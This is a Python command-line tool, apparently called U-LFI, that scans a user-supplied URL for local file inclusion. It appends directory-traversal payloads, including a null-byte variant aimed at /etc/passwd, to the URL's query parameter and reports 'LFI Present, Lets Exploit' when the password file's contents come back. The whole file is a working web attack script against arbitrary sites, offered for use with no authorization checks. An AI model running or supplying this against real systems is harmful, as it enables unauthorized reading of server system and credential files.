print("""
\033[1;m\033[1;31m                                                  (     (     (      \033[1;m
\033[1;m\033[1;34m        (     )                      )              )\ )  )\ )  )\ )  \033[1;m
\033[1;m\033[1;34m    (   )\ ( /( (      )       )  ( /(   (         (()/( (()/( (()/(  \033[1;m
\033[1;m\033[1;33m    )\ ((_))\()))\    (     ( /(  )\()) ))\        /(_)) /(_)) /(_)) \033[1;m
\033[1;m\033[1;33m _ ((_) _ (_))/((_)   )\  ' )(_))(_))/ /((_)       (_))  (_))_|(_))   \033[1;m
\033[1;m\033[1;31m| | | || || |_  (_) _((_)) ((_)_ | |_ (_))   ___   | |   | |_  |_ _|  \033[1;m
\033[1;m\033[1;31m| |_| || ||  _| | || '  \()/ _` ||  _|/ -_) |___|  | |__ | __|  | |   \033[1;m
\033[1;m\033[1;31m\___/ |_| \__| |_||_|_|_| \__,_| \__|\___|         |____||_|   |___|  \033[1;m
                                                                           
""")
print("""
\t\t\033[1;m\033[1;36mUsage: python3 U-LFI.py \033[1;m
\033[1;m\033[1;36mNOTE: Url should start with http:// or https:// and ends with parameter \033[1;m
\033[1;m\033[1;36mlike- page=, id=, file= \033[1;m

\033[1;m\033[1;37m Example- http://example.com/data/subs.php?file=10 \033[1;m
""")

try:
    import urllib.request
    import bs4 as bs
    import sys
except:
    print("Install BS4 Please.!")

path = '../../../../../../../../../../../../../../etc/passwd'
path2 = "../../../../../../../../../../../../../../etc/passwd%00"


url = input("\033[1;m\033[1;32m Enter Url:- \033[1;m ")
urln = url.split('=')
urln = urln[0]+"="



print("\033[1;m\033[1;31m [0]Wait Sir, Scanning \n \033[1;m")


def lfiscan():
    headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}

    try:
            request = urllib.request.Request(urln+path, headers=headers)
            link = urllib.request.urlopen(request).read()
            bo = bs.BeautifulSoup(link, 'html.parser')
            text1 = bs.BeautifulSoup.get_text(bo)
    except:
            print("\033[1;m\033[1;31m [0]Invalid Url/Parameter..Please Check The Url Again.. \033[1;m \n")
            print("\033[1;m\033[1;31m [0]Make sure Url starts with http:// and ends with Parameters Like- page=, file= \033[1;m")
            sys.exit(0)

    try:
            request = urllib.request.Request(urln+path2, headers=headers)
            link = urllib.request.urlopen(request).read()
            bo = bs.BeautifulSoup(link, 'html.parser')
            text2 = bs.BeautifulSoup.get_text(bo)
    except:
            print("\033[1;m\033[1;31m [0]Invalid Url/Parameter..Please Check The Url Again.. \033[1;m \n")
            print("\033[1;m\033[1;31m [0]Make sure Url starts with http:// and ends with Parameters Like- page=, file= \033[1;m")
            sys.exit(0)

    if "root:x:" in text1:
            print(urln, "\033[1;m\033[1;32m \n ----->LFI Present, Lets Exploit \033[1;m")

    elif "root:x:" in text2:
            print(urln, "\033[1;m\033[1;32m \n ----->LFI Present \033[1;m")
    else:
            print("\033[1;m\033[1;31m----->LFI Not Present \033[1;m")

lfiscan()
